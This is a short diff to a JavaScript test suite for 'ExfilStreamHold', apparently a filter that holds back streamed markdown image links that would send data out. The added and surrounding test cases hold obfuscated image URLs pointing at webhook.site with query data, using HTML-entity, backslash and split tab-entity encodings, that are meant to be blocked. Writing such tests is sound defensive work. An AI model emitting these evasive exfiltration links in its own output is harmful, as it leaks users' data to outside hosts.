@@ -191,6 +191,8 @@ describe('ExfilStreamHold', () => {
     expect(run(['Chart ![c](https&#58;&#47;&#47;webhook.site/', 'abc?d=1)'])).toBeNull()
     expect(run(['Chart ![c](https:\\webhook.site/abc?d=1)'])).toBeNull()
     expect(run(['Chart ![c](https&#58;&#47;&#47;cdn.trusted.com/a.png)'])).not.toBeNull()
+    // A tab entity, which marked leaves for the browser to decode and strip.
+    expect(run(['Chart ![c](ht&#', '9;tps://webhook.site/abc?d=1)'])).toBeNull()
   })
 
   // #674: a poster, a srcset candidate and an href are held like an image's src.
